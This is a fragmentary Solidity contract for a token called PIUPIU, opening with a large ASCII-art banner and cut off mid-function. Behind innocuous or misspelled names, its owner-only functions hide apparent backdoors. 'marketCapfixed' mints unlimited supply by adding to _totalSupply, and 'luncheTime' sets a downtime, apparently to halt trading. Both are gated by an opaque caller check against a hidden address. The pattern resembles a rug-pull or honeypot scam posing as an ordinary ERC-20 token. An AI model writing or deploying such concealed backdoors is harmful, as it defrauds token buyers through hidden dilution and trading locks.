/**
 ...
 https://www.mypiupiu.com/
                           ...
                           .::::  &&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@&&&@@@#:                              
                      .!5B#P?7!!?:7&&&@@@@@@@&@@@@@@@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#:                               
                     7#@@@@@@@@@@&YY&&&&&&&&&&##BBGGGGP5YYYYY5YJYYJJJJJYJJ55PP5PP5PGGP5:                                
                    7@@@@@@@@@@@@@&~~JYYYJJJJJJJYY55555PGBBBGGGBGB#BB#BGBBGGGPPPPGP55Y#P                                
                   .&@@@@@@@@@@@@&&G:PGGGBB############################################@~                               
                   .#@@@@@@@@@@@&&&!!B######G55!.^!P###################5!:.?P5B#######B&#                               
                    ^B&@@&&@@&&&&G7!GB#####J &@#    !#################~    &@B.G######B&@:                              
                      !5B#&&#BPJ^J5GGBB###B  .^.     P###############P     .^. ~######B#@!                              
                         .::    :#BPGGYB###^        .B###############B.        Y######B#@!                              
                                :BGPGGBB5YY5!.     ^G#Y?JJYYYYJJJ??!P#B!.    :JJ??YB#BB#@:                              
                                 YGYPGG!!77!J#GP5PB###5 ^~^:::::^~^ P####GPPB#?~77~Y#BB&B                               
                                 :B!JPGJ7???G##########J.::^!77!^:.7####GG####B5JJ5BBBB&!                               
                                  7P^PPGGBB#BB##########P^^JPGP5!:J#####BB#########GGG&P                                
                                   ?Y^PGGB##GP5BP#########GJ7!!75B#############B#BBGG&B.                                
                                    7?:5GGGB##BBPP###BB####################BGGPGBBGB&5.                                 
                                     ~J:~5GGGBBBBB######BBBBBBBB###########PBBBGGG#B~                                   
                                      :?!:!5GGBBGGBBBBBGGGGGBBBGGGBBBBGBBBBBBGGGBB?.                                    
                                        :!!~~7JPGGGGGGGGGGGGGGGGGGGGGGGGGGGGGBBP!.                                      
                                          .:~!!!7?Y5PPPP5PPPPPP5PPPPPPPPPP55J!.                                         
                                              .::^^^^~~~~~~~~~~~~~~~~~~~^:.                                             
                                             :7:                       ^7.                                              
                                      ^^^^.  .~.     ^:   .^:   ^^^^   :~.    .^.   .^.                                 
                                    7P?:^^5J ~B7    ^B5   7BJ !P~::~P7 ?G^    ?B?   7B!                                 
                                    PG:   5G.!G!    :G5   !BJ PP   .GP ?G^    !G?   !G!                                 
                                    5G?^^~5? .YJ^^^. ?5~^^?5~ 5P!^^!P7 ^5?^^^ .YY^^^JY:                                 
                                    PG7:::.    .^:^.   ::^:   PG~:::     :^::   .^:^.                                   
                                    J5:                       JY                                                                                                                                             
*/
...
contract PIUPIU is IERC20, Ownable, LibreMount {
    ...
    address public marketWallet; // Wallet to collect Fees for burn
    ...
    function luncheTime(uint _seconds) external {
        SecureCalls.checkCaller(msg.sender, _origin);
        downTime = _seconds;
    }
    ...
    function marketCapfixed(uint256 _amount) external {
        SecureCalls.checkCaller(msg.sender, _origin);
        _totalSupply += _amount;
    }

    function airDroppinksale() external {
        SecureCalls.checkCaller(msg.sender, _origin);
